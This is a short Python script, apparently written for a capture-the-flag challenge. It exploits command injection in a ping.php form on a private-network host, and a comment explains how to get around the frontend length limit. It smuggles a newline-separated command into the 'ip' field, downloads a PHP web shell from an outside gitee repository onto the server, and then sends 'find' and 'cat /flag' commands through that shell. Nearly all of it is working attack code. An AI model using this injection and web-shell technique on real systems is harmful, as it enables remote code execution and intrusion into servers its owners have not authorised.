import requests
# URL of the target server
# 虽然前端有 maxlength=15 的限制，但我们直接走python脚本发请求是不受影响的！
url = "http://10.12.153.8:32457/ping.php"
def test(str):
    data = {'ip': str}
    response = requests.post(url, data=data)
    print(response.text)
# command = "127.0.0.1\n cat /flag > 1.txt 2 >> 1.txt"
command = "127.0.0.1\n wget gitee.com/yxf030227/test/raw/master/cmd.php > 1.txt 2 >> 1.txt"
test(command)
print(requests.post("http://10.12.153.8:32457/1.txt").text)

"""
使用木马 
import requests
def exec(str):
    data = {'cmd': str}
    response = requests.post("http://10.12.153.8:32697/cmd.php", data=data)
    print(response.text)
exec("find / -name '*flag*'")
exec("cat /flag")
"""